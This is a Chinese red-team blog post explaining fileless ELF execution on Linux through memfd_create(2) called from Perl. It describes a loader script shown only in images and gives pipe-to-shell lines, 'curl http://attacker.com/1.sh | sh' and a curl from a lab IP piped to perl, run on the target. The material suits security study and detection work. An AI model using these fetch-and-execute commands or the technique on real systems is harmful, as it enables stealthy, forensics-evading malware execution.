---
layout: post
title: Linux无文件渗透执行ELF
date: 2018-05-15 13:43:02
categories: [Pentest, Red Team]
---

> 本文首发[逢魔安全实验室微信公众号](https://mp.weixin.qq.com/s/SdR6ce9xjbS5UQbh14kfgg)

### 0x01 简介

在进行Linux系统的攻击应急时，大家可能会查看pid以及/proc相关信息，比如通过*/proc/$pid/cmdline*查看某个可疑进程的启动命令，通过*/proc/$pid/exe*抓样本等，但是攻击者是否会通过某种类似于*curl http://attacker.com/1.sh | sh*的方法来执行elf二进制文件呢？最近看了一篇@MagisterQuis写的文章https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html，思路比较奇特，这里分享给大家，当然本文大部分内容都来自于这篇文章，大家也可以直接去读原文。

![](http://reverse-tcp.xyz/static/img/posts/fileless-elf/pvl7sjjxrg.jpg)

### 0x02 技术核心

这里向大家介绍一个linux系统的底层调用函数*memfd_create(2)，*它在内核3.17中引入，会创建一个匿名文件并返回一个文件描述符指向它，该文件表现和常规文件类同， 可以进行修改，截断，内存映射等等，但不同的是，它存在于RAM当中。这就是可以被攻击者所利用的，如果有办法将需要执行elf通过*memfd_create(2)*写入内存中进行执行的话就可以达到我们的目的。

![](http://reverse-tcp.xyz/static/img/posts/fileless-elf/l3ju6ct2aj.jpg)

对于该匿名文件的命名man信息中的解释如下：

> The name supplied in name is used as a filename and will be displayed as the target of the corresponding symbolic link in the directory /proc/self/fd/.  The displayed name is always prefixed with memfd: and serves only for debugging purposes.  Names do not affect the behavior of the file descriptor, and as such multiple files can have the same name without any side effects.

类似于下面这样，当我们在虚拟文件系统中查看该进程信息时，在memfd:后面会出现对于该文件名称，甚至对于匿名文件的命名可以是空的。

![](http://reverse-tcp.xyz/static/img/posts/fileless-elf/qe5yu1ocku.jpg)

这里我们已经知道调用*memfd_create(2)*可以达到我们的目的，但是该怎么调用呢？perl语言中提供了一个*syscall()*方法可以满足我们的需求，当然python也可以，但是python实现该功能需要依赖第三方库。

*memfd_create()*调用时需要传入两个参数，一个是文件名，一个是*MFD_CLOEXEC*标志（类似于*O_CLOEXEC*），以便当我们执行ELF二进制文件时，我们得到的文件描述符将被自动关闭。当然我们使用perl传递*memfd_create(2)*的原始系统调用号和*MEMFD_CLOEXEC*的数字常量， 这两个都可以在/usr/include的头文件中找到。 系统调用号码存储在以_NR开头的#define中。

![](http://reverse-tcp.xyz/static/img/posts/fileless-elf/8zspn1e9aq.jpg)

这里我们已经获取到了*memfd_create(2)*的系统调用码（在64位操作系统中为319）和*MFD_CLOEXEC*（0x0001U），这时候我们就可以使用perl的syscall函数来调用*memfd_create(2)* : *fd = syscall(319, $name, MFD_CLOEXEC))*也就是类似于*fd = memfd_create($name, MFD_CLOEXEC)*

### 0x03 EXP实现

这里开始编写perl利用脚本，脚本分为三部分，第一部分创建内存匿名文件并写入ELF文件内容

![](http://reverse-tcp.xyz/static/img/posts/fileless-elf/p3ut8qagu6.jpg)

这里还有一个问题，如何将elf二进制文件写入到创建的文件当中，@MagisterQuis这里使用open函数将$FH内容添加进创建的匿名文件$fd当中，而$FH通过perl转化自要执行的elf文件，这就是该脚本的第二部分

![](http://reverse-tcp.xyz/static/img/posts/fileless-elf/41r78auzam.jpg)

第三部分就是执行该文件了，调用exec函数执行该匿名文件

![](http://reverse-tcp.xyz/static/img/posts/fileless-elf/2a03cym868.jpg)

这里我们最后的EXP就生产好了，我们可以目标机上执行 

*curl 192.168.1.138/elfload.pl | perl*

![](http://reverse-tcp.xyz/static/img/posts/fileless-elf/6w4ulsnckk.jpg)

![](http://reverse-tcp.xyz/static/img/posts/fileless-elf/kn3fq1eeov.jpg)

可以看到我们的elf文件最终以匿名文件的方式在内存中被加载执行了，从匿名文件运行的程序与运行于普通文件的程序之间唯一真正的区别是/proc/pid/exe符号链接。

原作者还使用了fork函数进行了一些进程操作，有兴趣的同学可以去了解一下。

### 0x04 参考

https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html

http://man7.org/linux/man-pages/man2/memfd_create.2.html